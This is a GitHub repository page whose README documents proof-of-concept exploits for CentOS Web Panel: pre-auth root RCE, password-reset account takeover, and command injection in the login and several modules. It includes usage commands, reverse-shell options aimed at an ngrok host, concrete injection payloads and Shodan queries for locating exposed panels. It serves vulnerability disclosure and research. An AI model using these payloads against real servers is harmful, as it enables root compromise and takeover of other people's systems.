=== Content from github.com_50bb458a_20250108_114414.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FImmersive-Labs-Sec%2FCentOS-WebPanel)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FImmersive-Labs-Sec%2FCentOS-WebPanel)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=Immersive-Labs-Sec%2FCentOS-WebPanel)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Immersive-Labs-Sec](/Immersive-Labs-Sec)
/
**[CentOS-WebPanel](/Immersive-Labs-Sec/CentOS-WebPanel)**
Public

* [Notifications](/login?return_to=%2FImmersive-Labs-Sec%2FCentOS-WebPanel) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2FImmersive-Labs-Sec%2FCentOS-WebPanel)
* [Star
   3](/login?return_to=%2FImmersive-Labs-Sec%2FCentOS-WebPanel)

Proof of concepts scripts for vulnerabilities in CentOS Web Panel

### License

[MIT license](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/LICENSE)

[3
stars](/Immersive-Labs-Sec/CentOS-WebPanel/stargazers) [2
forks](/Immersive-Labs-Sec/CentOS-WebPanel/forks) [Branches](/Immersive-Labs-Sec/CentOS-WebPanel/branches) [Tags](/Immersive-Labs-Sec/CentOS-WebPanel/tags) [Activity](/Immersive-Labs-Sec/CentOS-WebPanel/activity)
 [Star](/login?return_to=%2FImmersive-Labs-Sec%2FCentOS-WebPanel)

 [Notifications](/login?return_to=%2FImmersive-Labs-Sec%2FCentOS-WebPanel) You must be signed in to change notification settings

* [Code](/Immersive-Labs-Sec/CentOS-WebPanel)
* [Issues
  0](/Immersive-Labs-Sec/CentOS-WebPanel/issues)
* [Pull requests
  0](/Immersive-Labs-Sec/CentOS-WebPanel/pulls)
* [Actions](/Immersive-Labs-Sec/CentOS-WebPanel/actions)
* [Projects
  0](/Immersive-Labs-Sec/CentOS-WebPanel/projects)
* [Security](/Immersive-Labs-Sec/CentOS-WebPanel/security)
* [Insights](/Immersive-Labs-Sec/CentOS-WebPanel/pulse)

Additional navigation options

* [Code](/Immersive-Labs-Sec/CentOS-WebPanel)
* [Issues](/Immersive-Labs-Sec/CentOS-WebPanel/issues)
* [Pull requests](/Immersive-Labs-Sec/CentOS-WebPanel/pulls)
* [Actions](/Immersive-Labs-Sec/CentOS-WebPanel/actions)
* [Projects](/Immersive-Labs-Sec/CentOS-WebPanel/projects)
* [Security](/Immersive-Labs-Sec/CentOS-WebPanel/security)
* [Insights](/Immersive-Labs-Sec/CentOS-WebPanel/pulse)

# Immersive-Labs-Sec/CentOS-WebPanel

    main[Branches](/Immersive-Labs-Sec/CentOS-WebPanel/branches)[Tags](/Immersive-Labs-Sec/CentOS-WebPanel/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[15 Commits](/Immersive-Labs-Sec/CentOS-WebPanel/commits/main/) | | |
| [.gitignore](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/.gitignore ".gitignore") | | [.gitignore](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/.gitignore ".gitignore") |  |  |
| [LICENSE](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/LICENSE "LICENSE") | | [LICENSE](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/LICENSE "LICENSE") |  |  |
| [README.md](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/README.md "README.md") | | [README.md](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/README.md "README.md") |  |  |
| [api\_new\_user.php](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/api_new_user.php "api_new_user.php") | | [api\_new\_user.php](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/api_new_user.php "api_new_user.php") |  |  |
| [auth\_modules\_rce.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/auth_modules_rce.py "auth_modules_rce.py") | | [auth\_modules\_rce.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/auth_modules_rce.py "auth_modules_rce.py") |  |  |
| [internal\_api.php](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/internal_api.php "internal_api.php") | | [internal\_api.php](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/internal_api.php "internal_api.php") |  |  |
| [leak\_ssl\_cert.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/leak_ssl_cert.py "leak_ssl_cert.py") | | [leak\_ssl\_cert.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/leak_ssl_cert.py "leak_ssl_cert.py") |  |  |
| [password\_reset.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/password_reset.py "password_reset.py") | | [password\_reset.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/password_reset.py "password_reset.py") |  |  |
| [pre\_auth\_rce.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/pre_auth_rce.py "pre_auth_rce.py") | | [pre\_auth\_rce.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/pre_auth_rce.py "pre_auth_rce.py") |  |  |
| [user\_auth\_rce.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/user_auth_rce.py "user_auth_rce.py") | | [user\_auth\_rce.py](/Immersive-Labs-Sec/CentOS-WebPanel/blob/main/user_auth_rce.py "user_auth_rce.py") |  |  |
| View all files | | |

## Repository files navigation

* README
* MIT license
# CentOS-WebPanel

Proof of concepts scripts for vulnerabilities in CentOS Web Panel

## Pre Auth RCE

* WebPanel Versions <= 0.9.8.1120

It is possible to gain Remote Code Execution as root without any privlidges. This exploit chains a Local File Inclusion Vulnerability with a Command Injection vulnerability.

### Example

```
python3 pre_auth_rce.py --target "127.0.0.1" --command "sleep 15"

```

You can optionally provide a Port Number and Local IP address to trigger a reverse shell

## Account Takeover

The Password Reset process uses predictable data to generate the reset token. If you know a users username and email address it is possible to reset any user account.

This process does not work for the `root` account and will trigger a password reset email bieng sent to the target email address.

### Example

```
python3 password_reset.py --target "<targetip>" --username "random" --email_address "my@email.com" --password "RandomPassword"
[+] Sending Reset Request to Target
  [-] Got Date 2022-01-31 14:47:34 from response
  [-] Generating Reset Token with username, email and reset token
  [*] Token: 681bb70c8452b33f9d7b6e319c20727b
[+] Confirming Reset Token
[+] Sending New Password with Reset Token
[*] Password has been set to "RandomPassword" for username "random"

```

## Internal API

The webpanel uses an internal API that is not protected from access. Any user account with the ability to host files via the FileManager can access this API.

This API exposes many fucntions that include listing, modifying and creating accounts.
An example `internal_api.php` file can be uploaded and accessed from a browser to demonstrate some of the exposed capabilities.

## Run Command as root (User Login)

A command injection vulnerability exists in the user login flows. By injecting data in to the `userlang` parameter we can gain code execution as root.
This requires a valid username and password but can be chained with the account takeover listed above.

### Example

```
python3 user_auth_rce.py --target "<targetip>" --username "random" --password "RandomPassword" --command "sleep 5"

```

If `lhost` and `lport` are provided the exploit script will attempt to run a reverse shell that will connect as root to a netcat listener.

```
python3 user_auth_rce.py --target "<targetip>" --username "random" --password "RandomPassword" --lhost "4.tcp.eu.ngrok.io" --lport 13921

```

## Run Command as root (User Modules)

* WebPanel Versions <= 0.9.8.1124

Using this collection of vulnearbilitues it is possible for a standard user to gain code exection as root by injecting commands in to POST paramaters for a range of modules.

This exploit requires existing user credentials, this can be chained with the Account Takeover vulnerability listed above.

### Example

```
python3 priv_esc_module_rce.py --target "<targetip>" --username "random" --password "RandomPassword" --command '`sleep 15`' --module 'dns_zone_editor'
[+] Logging in to target with username random
  [-] Auth Successful
  [-] Selecting Module dns_zone_editor
  [-] Attempting to trigger RCE
[*] Command probably executed

```

### Modules

There are several vulnerable modules

1. Adds a new DNS record with a command injection in the name field.

* [POST] `/index.php?module=mysql_manager&acc=optimizerdb`
* [DATA] `namereg=touch /tmp/hello&domain=test.example.com&cachereg=1&valuereg="aGVsbG8="&reg=TXT`

2. Optimize database

* [POST] `/index.php?module=mysql_manager&acc=`optimizerdb`
* [DATA] `db=test_hello$(whoami>/tmp/xxx)`

3. Disk usage

* `[POST] /index.php?module=disk_usage&acc=load_directory`
* `[DATA] folder_name='/home/<username>/$(id>/tmp/id)'`

4. SSL Certificate Info

* `[POST] /index.php?module=letsencrypt&acc=infomodal`
* `[DATA] domain=test.example.com$(whoami>/tmp/www)&type=info`

5. Error log viewer

* `[POST] index.php?module=error_log&acc=select`
* `[DATA] domain=test.example.com&tipe=access&numline=20&op=select&textsearch=howdy$(id>/tmp/howdy)`

### Detecting

Shodan

<https://www.shodan.io/search?query=%22Server%3A+cwpsrv%22>

`Set-Cookie: cwpsrv-`
`Server: cwpsrv`

SSL: |- Organization:
CentOS Web Panel

## About

Proof of concepts scripts for vulnerabilities in CentOS Web Panel

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/Immersive-Labs-Sec/CentOS-WebPanel/activity)
[Custom properties](/Immersive-Labs-Sec/CentOS-WebPanel/custom-properties)
### Stars

[**3**
stars](/Immersive-Labs-Sec/CentOS-WebPanel/stargazers)
### Watchers

[**1**
watching](/Immersive-Labs-Sec/CentOS-WebPanel/watchers)
### Forks

[**2**
forks](/Immersive-Labs-Sec/CentOS-WebPanel/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FImmersive-Labs-Sec%2FCentOS-WebPanel&report=Immersive-Labs-Sec+%28user%29)

## [Releases](/Immersive-Labs-Sec/CentOS-WebPanel/releases)

No releases published

## [Packages 0](/orgs/Immersive-Labs-Sec/packages?repo_name=CentOS-WebPanel)

No packages published

## [Contributors 3](/Immersive-Labs-Sec/CentOS-WebPanel/graphs/contributors)

## Languages

* [Python
  83.7%](/Immersive-Labs-Sec/CentOS-WebPanel/search?l=python)
* [PHP
  16.3%](/Immersive-Labs-Sec/CentOS-WebPanel/search?l=php)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


